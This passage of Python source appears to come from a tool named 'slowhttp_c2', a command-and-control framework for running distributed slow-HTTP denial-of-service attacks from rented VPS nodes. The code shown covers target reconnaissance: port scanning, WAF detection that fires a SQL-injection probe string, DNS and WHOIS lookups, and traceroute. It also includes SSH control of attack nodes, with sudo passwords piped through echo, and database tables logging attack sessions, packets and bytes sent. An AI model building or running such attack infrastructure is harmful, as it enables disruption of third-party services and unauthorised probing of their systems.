            row_str = " | ".join(str(row[i]).ljust(col_widths[i]) for i in range(min(len(row), len(headers))))
            print(row_str)
    
    def print_progress_bar(self, iteration, total, prefix='', suffix='', length=50, fill='█'):
        """Print a progress bar"""
        percent = f"{100 * (iteration / float(total)):.1f}"
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '░' * (length - filled_length)
        
        print(f"\r{prefix} |{Colors.CYAN}{bar}{Colors.RESET}| {percent}% {suffix}", end='\r')
        
        # Print new line on completion
        if iteration == total:
            print()
    
    def print_spinner(self, text='Processing'):
        """Print a spinner for one frame"""
        spinner = self.spinner_frames[self.spinner_index]
        self.spinner_index = (self.spinner_index + 1) % len(self.spinner_frames)
        
        print(f"\r{Colors.CYAN}{spinner}{Colors.RESET} {text}...", end='', flush=True)
    
    def input_with_validation(self, prompt, validator=None, error_msg=None, default=None, password=False):
        """Get user input with validation"""
        while True:
            if default is not None:
                display_prompt = f"{prompt} [{default}]: "
            else:
                display_prompt = f"{prompt}: "
            
            if password:
                import getpass
                value = getpass.getpass(display_prompt)
            else:
                value = input(display_prompt)
            
            # Use default if input is empty
            if not value and default is not None:
                return default
            
            # Validate if validator function is provided
            if validator is None or validator(value):
                return value
            else:
                if error_msg:
                    print(f"{Colors.RED}{error_msg}{Colors.RESET}")
    
    def input_menu(self, title, options, prompt="Enter your choice"):
        """Display a menu and get user selection"""
        while True:
            self.clear_screen()
            self.print_header(title)
            
            for i, option in enumerate(options, 1):
                print(f"{i}. {option}")
            
            print(f"\n0. Back/Exit")
            
            try:
                choice = int(input(f"\n{prompt}: "))
                if choice == 0:
                    return 0
                elif 1 <= choice <= len(options):
                    return choice
                else:
                    print(f"{Colors.RED}Invalid choice. Please try again.{Colors.RESET}")
                    time.sleep(1)
            except ValueError:
                print(f"{Colors.RED}Please enter a number.{Colors.RESET}")
                time.sleep(1)
    
    def confirm_action(self, prompt="Are you sure?", default=False):
        """Get confirmation from user"""
        default_str = "Y/n" if default else "y/N"
        response = input(f"{prompt} [{default_str}]: ").strip().lower()
        
        if not response:
            return default
            
        return response.startswith('y')
    
    def wait_for_keypress(self, prompt="Press any key to continue..."):
        """Wait for a keypress"""
        if os.name == 'nt':
            import msvcrt
            print(prompt, end='', flush=True)
            msvcrt.getch()
            print()
        else:
            input(prompt)
    
    def print_status(self, message, status, success_word="SUCCESS", failure_word="FAILED"):
        """Print a status message with colored status indicator"""
        if status:
            status_str = f"{Colors.GREEN}{success_word}{Colors.RESET}"
        else:
            status_str = f"{Colors.RED}{failure_word}{Colors.RESET}"
        
        print(f"{message}: {status_str}")
    
    def print_dict(self, data, indent=0):
        """Print a dictionary in a readable format"""
        if not isinstance(data, dict):
            print(" " * indent + str(data))
            return
            
        for key, value in data.items():
            if isinstance(value, dict):
                print(" " * indent + f"{Colors.BOLD}{key}:{Colors.RESET}")
                self.print_dict(value, indent + 2)
            elif isinstance(value, list):
                print(" " * indent + f"{Colors.BOLD}{key}:{Colors.RESET}")
                for item in value:
                    if isinstance(item, dict):
                        self.print_dict(item, indent + 2)
                    else:
                        print(" " * (indent + 2) + str(item))
            else:
                print(" " * indent + f"{Colors.BOLD}{key}:{Colors.RESET} {value}")

class NetworkTools:
    """Network reconnaissance and analysis tools with improved error handling"""
    
    def __init__(self):
        """Initialize network tools"""
        self.cache = {}  # Cache for DNS and other lookups
        self.cache_timeout = 3600  # Cache timeout in seconds (1 hour)
    
    def lookup_dns_history(self, domain):
        """Look up current and historical DNS records"""
        results = {
            "domain": domain,
            "current_records": {},
            "historical_records": []
        }
        
        # Check cache first
        cache_key = f"dns_{domain}"
        cached = self._get_from_cache(cache_key)
        if cached:
            return cached
        
        # Get current DNS records
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]
        
        for record_type in record_types:
            try:
                if DNS_AVAILABLE:
                    answers = dns.resolver.resolve(domain, record_type)
                    results["current_records"][record_type] = [str(rdata) for rdata in answers]
                else:
                    # Fallback using socket for A records
                    if record_type == "A":
                        try:
                            ip = socket.gethostbyname(domain)
                            results["current_records"]["A"] = [ip]
                        except:
                            pass
            except Exception as e:
                logger.debug(f"Error getting {record_type} records for {domain}: {str(e)}")
        
        # Store in cache
        self._store_in_cache(cache_key, results)
        
        return results
    
    def detect_waf(self, target_url):
        """Detect if a website is protected by a WAF"""
        results = {
            "url": target_url,
            "waf_detected": False,
            "waf_type": None,
            "confidence": 0,
            "details": []
        }
        
        # Check cache first
        cache_key = f"waf_{target_url}"
        cached = self._get_from_cache(cache_key)
        if cached:
            return cached
        
        if not REQUESTS_AVAILABLE:
            results["details"].append("Requests module not available")
            return results
        
        try:
            # Send a request with suspicious parameters to trigger WAF
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            
            # Add suspicious query parameter to potentially trigger WAF
            if "?" in target_url:
                test_url = target_url + "&id=1' OR '1'='1"
            else:
                test_url = target_url + "?id=1' OR '1'='1"
            
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Check for WAF signatures in headers
            waf_signatures = {
                "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
                "AWS WAF": ["x-amzn-waf", "awselb"],
                "Akamai": ["akamai", "akamaighost"],
                "Imperva": ["incap_ses", "visid_incap"],
                "F5 BIG-IP": ["bigip", "f5"],
                "Sucuri": ["sucuri", "cloudproxy"],
                "ModSecurity": ["mod_security", "modsecurity"],
                "Fortinet": ["fortigate", "fortiweb"],
                "Barracuda": ["barracuda"],
                "Citrix": ["netscaler", "citrix"]
            }
            
            # Check response headers
            for waf_name, signatures in waf_signatures.items():
                for header, value in response.headers.items():
                    header_lower = header.lower()
                    value_lower = value.lower()
                    
                    for sig in signatures:
                        if sig in header_lower or sig in value_lower:
                            results["waf_detected"] = True
                            results["waf_type"] = waf_name
                            results["confidence"] = 90
                            results["details"].append(f"Signature found in headers: {sig}")
                            break
            
            # Check for WAF behavior
            if response.status_code in [403, 406, 429, 503] and not results["waf_detected"]:
                results["waf_detected"] = True
                results["waf_type"] = "Unknown WAF"
                results["confidence"] = 60
                results["details"].append(f"Suspicious response code: {response.status_code}")
            
            # Check for WAF keywords in response body
            waf_keywords = [
                "firewall", "blocked", "security", "unauthorized", "suspicious",
                "attack", "malicious", "bot", "challenge", "captcha"
            ]
            
            body_lower = response.text.lower()
            for keyword in waf_keywords:
                if keyword in body_lower and not results["waf_detected"]:
                    results["waf_detected"] = True
                    results["waf_type"] = "Unknown WAF"
                    results["confidence"] = 50
                    results["details"].append(f"Keyword found in response: {keyword}")
                    break
            
        except Exception as e:
            results["details"].append(f"Error during WAF detection: {str(e)}")
        
        # Store in cache
        self._store_in_cache(cache_key, results)
        
        return results
    
    def scan_ports(self, target_host, ports=None, timeout=2):
        """Scan common ports on a target host"""
        if ports is None:
            # Default common ports to scan
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 8080, 8443]
        
        results = {
            "host": target_host,
            "open_ports": [],
            "closed_ports": [],
            "filtered_ports": [],
            "scan_time": None
        }
        
        # Check cache first
        cache_key = f"portscan_{target_host}_{'-'.join(map(str, ports))}"
        cached = self._get_from_cache(cache_key)
        if cached:
            return cached
        
        start_time = time.time()
        
        # Resolve hostname to IP if needed
        try:
            ip_address = socket.gethostbyname(target_host)
        except socket.gaierror:
            results["error"] = f"Could not resolve hostname: {target_host}"
            return results
        
        # Scan each port
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                
                result = sock.connect_ex((ip_address, port))
                
                if result == 0:
                    # Port is open
                    service = self._get_service_name(port)
                    results["open_ports"].append({"port": port, "service": service})
                else:
                    # Port is closed or filtered
                    results["closed_ports"].append(port)
                
                sock.close()
                
            except socket.timeout:
                # Connection timed out, port might be filtered
                results["filtered_ports"].append(port)
            except Exception as e:
                logger.debug(f"Error scanning port {port}: {str(e)}")
                results["filtered_ports"].append(port)
        
        end_time = time.time()
        results["scan_time"] = round(end_time - start_time, 2)
        
        # Store in cache
        self._store_in_cache(cache_key, results)
        
        return results
    
    def traceroute(self, target_host, max_hops=30, timeout=2):
        """Perform a traceroute to the target host"""
        results = {
            "target": target_host,
            "hops": [],
            "complete": False
        }
        
        # Check cache first
        cache_key = f"traceroute_{target_host}"
        cached = self._get_from_cache(cache_key)
        if cached:
            return cached
        
        # Resolve hostname to IP if needed
        try:
            dest_addr = socket.gethostbyname(target_host)
        except socket.gaierror:
            results["error"] = f"Could not resolve hostname: {target_host}"
            return results
        
        # Create raw socket for ICMP
        try:
            icmp_proto = socket.getprotobyname("icmp")
            udp_proto = socket.getprotobyname("udp")
            
            for ttl in range(1, max_hops + 1):
                # Create sockets
                recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp_proto)
                send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, udp_proto)
                
                # Set timeout
                recv_socket.settimeout(timeout)
                
                # Set TTL
                send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
                
                # Bind receive socket
                recv_socket.bind(("", 0))
                
                # Random port for destination
                port = 33434 + ttl
                
                # Start time
                start_time = time.time()
                
                try:
                    # Send packet
                    send_socket.sendto(b"", (dest_addr, port))
                    
                    # Wait for response
                    _, curr_addr = recv_socket.recvfrom(512)
                    curr_addr = curr_addr[0]
                    
                    # End time
                    end_time = time.time()
                    
                    # Calculate RTT
                    rtt = round((end_time - start_time) * 1000, 2)
                    
                    # Try to get hostname
                    try:
                        host = socket.gethostbyaddr(curr_addr)[0]
                    except socket.herror:
                        host = None
                    
                    # Add hop to results
                    results["hops"].append({
                        "hop": ttl,
                        "ip": curr_addr,
                        "hostname": host,
                        "rtt": rtt
                    })
                    
                    # Check if we reached the destination
                    if curr_addr == dest_addr:
                        results["complete"] = True
                        break
                        
                except socket.timeout:
                    # Timeout, add * for this hop
                    results["hops"].append({
                        "hop": ttl,
                        "ip": "*",
                        "hostname": None,
                        "rtt": None
                    })
                except Exception as e:
                    logger.debug(f"Error in traceroute hop {ttl}: {str(e)}")
                    results["hops"].append({
                        "hop": ttl,
                        "ip": "?",
                        "hostname": None,
                        "rtt": None,
                        "error": str(e)
                    })
                finally:
                    # Close sockets
                    send_socket.close()
                    recv_socket.close()
        
        except Exception as e:
            results["error"] = f"Traceroute error: {str(e)}"
        
        # Store in cache
        self._store_in_cache(cache_key, results)
        
        return results
    
    def whois_lookup(self, domain):
        """Perform a WHOIS lookup for a domain"""
        results = {
            "domain": domain,
            "registrar": None,
            "creation_date": None,
            "expiration_date": None,
            "name_servers": [],
            "status": [],
            "raw_data": None
        }
        
        # Check cache first
        cache_key = f"whois_{domain}"
        cached = self._get_from_cache(cache_key)
        if cached:
            return cached
        
        # Use socket for basic WHOIS lookup
        try:
            # Connect to WHOIS server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("whois.internic.net", 43))
            
            # Send query
            s.send((domain + "\r\n").encode())
            
            # Receive response
            response = b""
            while True:
                data = s.recv(4096)
                if not data:
                    break
                response += data
            
            s.close()
            
            # Decode response
            raw_data = response.decode("utf-8", errors="ignore")
            results["raw_data"] = raw_data
            
            # Parse basic information
            for line in raw_data.splitlines():
                line = line.strip()
                
                if line.startswith("Registrar:"):
                    results["registrar"] = line.split("Registrar:")[1].strip()
                
                elif line.startswith("Creation Date:"):
                    results["creation_date"] = line.split("Creation Date:")[1].strip()
                
                elif line.startswith("Registry Expiry Date:") or line.startswith("Expiration Date:"):
                    if "Registry Expiry Date:" in line:
                        results["expiration_date"] = line.split("Registry Expiry Date:")[1].strip()
                    else:
                        results["expiration_date"] = line.split("Expiration Date:")[1].strip()
                
                elif line.startswith("Name Server:"):
                    ns = line.split("Name Server:")[1].strip()
                    if ns and ns not in results["name_servers"]:
                        results["name_servers"].append(ns)
                
                elif line.startswith("Status:"):
                    status = line.split("Status:")[1].strip()
                    if status and status not in results["status"]:
                        results["status"].append(status)
            
        except Exception as e:
            results["error"] = f"WHOIS lookup error: {str(e)}"
        
        # Store in cache
        self._store_in_cache(cache_key, results)
        
        return results
    
    def _get_service_name(self, port):
        """Get service name for a port number"""
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            465: "SMTPS",
            587: "SMTP (submission)",
            993: "IMAPS",
            995: "POP3S",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP (alt)",
            8443: "HTTPS (alt)"
        }
        
        return common_ports.get(port, "Unknown")
    
    def _store_in_cache(self, key, data):
        """Store data in cache with timestamp"""
        self.cache[key] = {
            "data": data,
            "timestamp": time.time()
        }
    
    def _get_from_cache(self, key):
        """Get data from cache if not expired"""
        if key in self.cache:
            cache_entry = self.cache[key]
            if time.time() - cache_entry["timestamp"] < self.cache_timeout:
                return cache_entry["data"]
            else:
                # Expired, remove from cache
                del self.cache[key]
        
        return None
    
    def clear_cache(self):
        """Clear the cache"""
        self.cache.clear()
        return True

class SSHManager:
    """Enhanced SSH manager with auto-reconnect and improved error handling"""
    
    def __init__(self, db_manager=None):
        """Initialize SSH manager"""
        self.connections = {}  # Store active SSH connections
        self.lock = threading.RLock()  # Thread-safe operations
        self.db_manager = db_manager
        self.connection_timeout = 10  # Default timeout in seconds
        self.command_timeout = 30  # Default command timeout
        self.max_retries = 3  # Maximum connection retries
    
    def connect_vps(self, ip_address, username, password, port=22, timeout=None):
        """Connect to a VPS with retry logic and better error handling"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko not installed)"
        
        if timeout is None:
            timeout = self.connection_timeout
            
        # Generate connection key
        conn_key = f"{ip_address}:{port}"
        
        # Check if already connected
        with self.lock:
            if conn_key in self.connections and self._check_connection(conn_key):
                return True, "Already connected"
        
        # Try to connect with retries
        for attempt in range(self.max_retries):
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Connect with timeout
                client.connect(
                    hostname=ip_address,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                # Test connection with a simple command
                _, stdout, _ = client.exec_command("echo Connection successful", timeout=5)
                result = stdout.read().decode().strip()
                
                if result != "Connection successful":
                    raise Exception("Connection test failed")
                
                # Store connection
                with self.lock:
                    self.connections[conn_key] = {
                        'client': client,
                        'ip_address': ip_address,
                        'port': port,
                        'username': username,
                        'password': password,
                        'connected_at': datetime.now(),
                        'last_used': datetime.now()
                    }
                
                logger.info(f"Successfully connected to {ip_address}:{port}")
                return True, "Connected successfully"
                
            except Exception as e:
                logger.error(f"Connection attempt {attempt+1}/{self.max_retries} to {ip_address}:{port} failed: {str(e)}")
                
                # Close client if it exists
                if 'client' in locals():
                    try:
                        client.close()
                    except:
                        pass
                
                # Sleep before retry (except on last attempt)
                if attempt < self.max_retries - 1:
                    time.sleep(1 * (attempt + 1))  # Progressive backoff
        
        return False, f"Failed to connect after {self.max_retries} attempts"
    
    def _check_connection(self, conn_key):
        """Check if a connection is still active"""
        if conn_key not in self.connections:
            return False
            
        conn = self.connections[conn_key]
        client = conn['client']
        
        try:
            transport = client.get_transport()
            if transport is None or not transport.is_active():
                return False
                
            # Test connection with a simple command
            _, stdout, _ = client.exec_command("echo 1", timeout=5)
            result = stdout.read().decode().strip()
            
            if result != "1":
                return False
                
            # Update last used timestamp
            conn['last_used'] = datetime.now()
            return True
            
        except Exception as e:
            logger.warning(f"Connection check failed for {conn['ip_address']}: {str(e)}")
            return False
    
    def _reconnect_if_needed(self, conn_key):
        """Reconnect if the connection is down"""
        if not self._check_connection(conn_key):
            conn = self.connections[conn_key]
            
            # Try to close existing connection
            try:
                conn['client'].close()
            except:
                pass
                
            # Reconnect
            success, _ = self.connect_vps(
                conn['ip_address'],
                conn['username'],
                conn['password'],
                conn['port']
            )
            
            return success
        
        return True
    
    def execute_command(self, ip_address, command, timeout=None, retry=True):
        """Execute a command on a VPS with improved error handling"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko not installed)"
            
        if timeout is None:
            timeout = self.command_timeout
            
        # Get connection key
        port = 22  # Default port
        vps_data = self.db_manager.get_vps_by_ip(ip_address) if self.db_manager else None
        if vps_data:
            port = vps_data.get('ssh_port', 22)
            
        conn_key = f"{ip_address}:{port}"
        
        # Check connection and reconnect if needed
        with self.lock:
            if conn_key not in self.connections:
                if not self.db_manager:
                    return False, "Not connected and no database to get credentials"
                    
                vps_data = self.db_manager.get_vps_by_ip(ip_address)
                if not vps_data:
                    return False, f"No VPS found with IP {ip_address}"
                    
                success, msg = self.connect_vps(
                    vps_data['ip_address'],
                    vps_data['username'],
                    vps_data['password'],
                    vps_data['ssh_port']
                )
                
                if not success:
                    return False, f"Failed to connect: {msg}"
            
            # Reconnect if needed
            elif not self._check_connection(conn_key):
                if not retry:
                    return False, "Connection lost and retry disabled"
                    
                if not self._reconnect_if_needed(conn_key):
                    return False, "Failed to reconnect"
        
        # Execute command
        try:
            with self.lock:
                if conn_key not in self.connections:
                    return False, "Connection lost during execution"
                    
                client = self.connections[conn_key]['client']
                self.connections[conn_key]['last_used'] = datetime.now()
            
            # Execute with timeout
            _, stdout, stderr = client.exec_command(command, timeout=timeout)
            
            # Get output
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            # Check exit status
            exit_status = stdout.channel.recv_exit_status()
            
            if exit_status != 0:
                logger.warning(f"Command exited with status {exit_status}: {command}")
                logger.warning(f"Error output: {error}")
                
                # Return error output if available, otherwise return the regular output
                return False, error if error else output
            
            return True, output
            
        except Exception as e:
            logger.error(f"Command execution error on {ip_address}: {str(e)}")
            
            # Try to reconnect and retry once if connection was lost
            if retry:
                with self.lock:
                    if self._reconnect_if_needed(conn_key):
                        logger.info(f"Reconnected to {ip_address}, retrying command")
                        return self.execute_command(ip_address, command, timeout, retry=False)
            
            return False, f"Execution error: {str(e)}"
    
    def execute_command_with_sudo(self, ip_address, command, password=None, timeout=None):
        """Execute a command with sudo"""
        if not password and self.db_manager:
            vps_data = self.db_manager.get_vps_by_ip(ip_address)
            if vps_data:
                password = vps_data.get('password', '')
        
        sudo_command = f"echo '{password}' | sudo -S {command}"
        return self.execute_command(ip_address, sudo_command, timeout)
    
    def upload_file(self, ip_address, local_path, remote_path, retry=True):
        """Upload a file to a VPS"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko not installed)"
            
        if not os.path.exists(local_path):
            return False, f"Local file not found: {local_path}"
            
        # Get connection key
        port = 22  # Default port
        vps_data = self.db_manager.get_vps_by_ip(ip_address) if self.db_manager else None
        if vps_data:
            port = vps_data.get('ssh_port', 22)
            
        conn_key = f"{ip_address}:{port}"
        
        # Check connection and reconnect if needed
        with self.lock:
            if conn_key not in self.connections:
                if not self.db_manager:
                    return False, "Not connected and no database to get credentials"
                    
                vps_data = self.db_manager.get_vps_by_ip(ip_address)
                if not vps_data:
                    return False, f"No VPS found with IP {ip_address}"
                    
                success, msg = self.connect_vps(
                    vps_data['ip_address'],
                    vps_data['username'],
                    vps_data['password'],
                    vps_data['ssh_port']
                )
                
                if not success:
                    return False, f"Failed to connect: {msg}"
            
            # Reconnect if needed
            elif not self._check_connection(conn_key):
                if not retry:
                    return False, "Connection lost and retry disabled"
                    
                if not self._reconnect_if_needed(conn_key):
                    return False, "Failed to reconnect"
        
        # Upload file
        try:
            with self.lock:
                if conn_key not in self.connections:
                    return False, "Connection lost during upload"
                    
                client = self.connections[conn_key]['client']
                self.connections[conn_key]['last_used'] = datetime.now()
            
            # Create SFTP client
            sftp = client.open_sftp()
            
            # Create remote directory if it doesn't exist
            remote_dir = os.path.dirname(remote_path)
            if remote_dir:
                try:
                    sftp.stat(remote_dir)
                except:
                    # Directory doesn't exist, create it
                    self.execute_command(ip_address, f"mkdir -p {remote_dir}")
            
            # Upload file
            sftp.put(local_path, remote_path)
            sftp.close()
            
            return True, f"File uploaded to {remote_path}"
            
        except Exception as e:
            logger.error(f"File upload error to {ip_address}: {str(e)}")
            
            # Try to reconnect and retry once if connection was lost
            if retry:
                with self.lock:
                    if self._reconnect_if_needed(conn_key):
                        logger.info(f"Reconnected to {ip_address}, retrying upload")
                        return self.upload_file(ip_address, local_path, remote_path, retry=False)
            
            return False, f"Upload error: {str(e)}"
    
    def download_file(self, ip_address, remote_path, local_path, retry=True):
        """Download a file from a VPS"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko not installed)"
            
        # Get connection key
        port = 22  # Default port
        vps_data = self.db_manager.get_vps_by_ip(ip_address) if self.db_manager else None
        if vps_data:
            port = vps_data.get('ssh_port', 22)
            
        conn_key = f"{ip_address}:{port}"
        
        # Check connection and reconnect if needed
        with self.lock:
            if conn_key not in self.connections:
                if not self.db_manager:
                    return False, "Not connected and no database to get credentials"
                    
                vps_data = self.db_manager.get_vps_by_ip(ip_address)
                if not vps_data:
                    return False, f"No VPS found with IP {ip_address}"
                    
                success, msg = self.connect_vps(
                    vps_data['ip_address'],
                    vps_data['username'],
                    vps_data['password'],
                    vps_data['ssh_port']
                )
                
                if not success:
                    return False, f"Failed to connect: {msg}"
            
            # Reconnect if needed
            elif not self._check_connection(conn_key):
                if not retry:
                    return False, "Connection lost and retry disabled"
                    
                if not self._reconnect_if_needed(conn_key):
                    return False, "Failed to reconnect"
        
        # Download file
        try:
            with self.lock:
                if conn_key not in self.connections:
                    return False, "Connection lost during download"
                    
                client = self.connections[conn_key]['client']
                self.connections[conn_key]['last_used'] = datetime.now()
            
            # Create SFTP client
            sftp = client.open_sftp()
            
            # Check if remote file exists
            try:
                sftp.stat(remote_path)
            except:
                sftp.close()
                return False, f"Remote file not found: {remote_path}"
            
            # Create local directory if it doesn't exist
            local_dir = os.path.dirname(local_path)
            if local_dir and not os.path.exists(local_dir):
                os.makedirs(local_dir)
            
            # Download file
            sftp.get(remote_path, local_path)
            sftp.close()
            
            return True, f"File downloaded to {local_path}"
            
        except Exception as e:
            logger.error(f"File download error from {ip_address}: {str(e)}")
            
            # Try to reconnect and retry once if connection was lost
            if retry:
                with self.lock:
                    if self._reconnect_if_needed(conn_key):
                        logger.info(f"Reconnected to {ip_address}, retrying download")
                        return self.download_file(ip_address, remote_path, local_path, retry=False)
            
            return False, f"Download error: {str(e)}"
    
    def get_connection_status(self, ip_address):
        """Check if a VPS is connected"""
        # Find connection key
        for conn_key, conn in self.connections.items():
            if conn['ip_address'] == ip_address:
                return self._check_connection(conn_key)
        
        return False
    
    def disconnect_vps(self, ip_address):
        """Disconnect from a VPS"""
        # Find and remove all connections for this IP
        keys_to_remove = []
        
        with self.lock:
            for conn_key, conn in self.connections.items():
                if conn['ip_address'] == ip_address:
                    try:
                        conn['client'].close()
                    except:
                        pass
                    keys_to_remove.append(conn_key)
            
            # Remove from connections dict
            for key in keys_to_remove:
                if key in self.connections:
                    del self.connections[key]
        
        return len(keys_to_remove) > 0
    
    def disconnect_all(self):
        """Disconnect from all VPS"""
        with self.lock:
            for conn_key, conn in list(self.connections.items()):
                try:
                    conn['client'].close()
                except:
                    pass
            
            self.connections.clear()
        
        return True
    
    def cleanup_idle_connections(self, idle_timeout=300):
        """Close connections that have been idle for too long"""
        now = datetime.now()
        keys_to_remove = []
        
        with self.lock:
            for conn_key, conn in self.connections.items():
                last_used = conn.get('last_used', conn.get('connected_at', now))
                idle_time = (now - last_used).total_seconds()
                
                if idle_time > idle_timeout:
                    try:
                        conn['client'].close()
                    except:
                        pass
                    keys_to_remove.append(conn_key)
            
            # Remove from connections dict
            for key in keys_to_remove:
                if key in self.connections:
                    del self.connections[key]
        
        return len(keys_to_remove)

class DatabaseManager:
    """Enhanced database manager with improved error handling and recovery"""
    
    def __init__(self, db_file="slowhttp_c2.db"):
        """Initialize database with automatic schema creation"""
        self.db_file = db_file
        self.conn = None
        self.cursor = None
        self.lock = threading.RLock()  # Reentrant lock for thread safety
        self.security = SecurityManager()
        
        # Ensure database directory exists
        os.makedirs(os.path.dirname(db_file) if os.path.dirname(db_file) else ".", exist_ok=True)
        
        # Initialize database
        self._initialize_database()
    
    def _get_connection(self):
        """Get a database connection with retry logic"""
        max_retries = 3
        retry_delay = 1  # seconds
        
        for attempt in range(max_retries):
            try:
                if self.conn is None:
                    self.conn = sqlite3.connect(self.db_file, timeout=20)
                    self.conn.row_factory = sqlite3.Row
                
                return self.conn
            except sqlite3.Error as e:
                logger.error(f"Database connection error (attempt {attempt+1}/{max_retries}): {str(e)}")
                
                if self.conn:
                    try:
                        self.conn.close()
                    except:
                        pass
                    self.conn = None
                
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                else:
                    raise
    
    def _initialize_database(self):
        """Create database schema if it doesn't exist"""
        try:
            with self.lock:
                conn = self._get_connection()
                cursor = conn.cursor()
                
                # Create VPS table
                cursor.execute('''
                CREATE TABLE IF NOT EXISTS vps (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT,
                    ip_address TEXT UNIQUE,
                    username TEXT,
                    password TEXT,
                    ssh_port INTEGER DEFAULT 22,
                    status TEXT DEFAULT 'offline',
                    last_seen TIMESTAMP,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
                ''')
                
                # Create attack_sessions table
                cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_name TEXT,
                    target_host TEXT,
                    target_url TEXT,
                    attack_type TEXT,
                    vps_nodes TEXT,
                    status TEXT,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    parameters TEXT,
                    notes TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
                ''')
                
                # Create attack_results table
                cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id INTEGER,
                    vps_ip TEXT,
                    connections_active INTEGER,
                    packets_sent INTEGER,
                    bytes_sent INTEGER,
                    error_count INTEGER,
                    cpu_usage REAL,
                    memory_usage REAL,
                    response_codes TEXT,
                    status TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
                )
                ''')
                
                # Create settings table
                cursor.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
                ''')
                
                # Create logs table
                cursor.execute('''
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    level TEXT,
                    message TEXT,
                    source TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
                ''')
                
                conn.commit()
                
                # Check if we need to add any missing columns (for upgrades)
                self._check_and_update_schema()
                
        except sqlite3.Error as e:
            logger.error(f"Database initialization error: {str(e)}")
            raise
    
    def _check_and_update_schema(self):
        """Check for and add any missing columns in the schema"""
        try:
            with self.lock:
                conn = self._get_connection()
                cursor = conn.cursor()
                
                # Check VPS table for missing columns
                cursor.execute("PRAGMA table_info(vps)")
                columns = {row['name'] for row in cursor.fetchall()}
                
                if 'cpu_cores' not in columns:
                    cursor.execute("ALTER TABLE vps ADD COLUMN cpu_cores INTEGER")
                
                if 'memory_total' not in columns:
                    cursor.execute("ALTER TABLE vps ADD COLUMN memory_total INTEGER")
                
                if 'notes' not in columns:
                    cursor.execute("ALTER TABLE vps ADD COLUMN notes TEXT")
                
                # Check attack_sessions table for missing columns
                cursor.execute("PRAGMA table_info(attack_sessions)")
                columns = {row['name'] for row in cursor.fetchall()}
                
                if 'success_rate' not in columns:
                    cursor.execute("ALTER TABLE attack_sessions ADD COLUMN success_rate REAL")
                
                if 'error_details' not in columns:
                    cursor.execute("ALTER TABLE attack_sessions ADD COLUMN error_details TEXT")
                
                conn.commit()
                
        except sqlite3.Error as e:
            logger.error(f"Schema update error: {str(e)}")
            # Continue anyway - non-critical
    
    def execute_query(self, query, params=(), fetch_all=False, fetch_one=False):
        """Execute a database query with proper error handling"""
        result = None
        
        try:
            with self.lock:
                conn = self._get_connection()
                cursor = conn.cursor()
                
                cursor.execute(query, params)
                
                if fetch_all:
                    result = cursor.fetchall()
                elif fetch_one:
                    result = cursor.fetchone()
                else:
                    conn.commit()
                    result = cursor.lastrowid
                
                return result
                
        except sqlite3.Error as e:
            logger.error(f"Database query error: {str(e)}")
            logger.error(f"Query: {query}")
            logger.error(f"Params: {params}")
            
            if conn:
                try:
                    conn.rollback()
                except:
                    pass
            
            # Re-raise as a custom exception
            raise Exception(f"Database error: {str(e)}")
    
    def add_vps(self, name, ip_address, username, password, ssh_port=22):
        """Add a new VPS to the database"""
        # Validate inputs
        if not self.security.validate_ip_address(ip_address):
            raise ValueError("Invalid IP address format")
        
        if not self.security.validate_port(ssh_port):
            raise ValueError("Invalid SSH port")
        
        # Encrypt password
        encrypted_password = self.security.encrypt_password(password)
        
        query = '''
        INSERT INTO vps (name, ip_address, username, password, ssh_port, status, last_seen)
        VALUES (?, ?, ?, ?, ?, 'offline', NULL)
        '''
        
        return self.execute_query(query, (name, ip_address, username, encrypted_password, ssh_port))
    
